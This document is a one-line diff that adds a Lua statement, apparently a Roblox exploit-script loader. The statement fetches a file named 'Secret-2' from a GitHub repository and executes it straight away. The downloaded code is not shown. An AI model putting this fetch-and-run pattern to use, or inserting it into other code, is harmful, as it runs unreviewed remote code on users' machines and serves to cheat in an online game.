@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Hrvatskiik/GSS-Scripts/main/Secret-2"))()
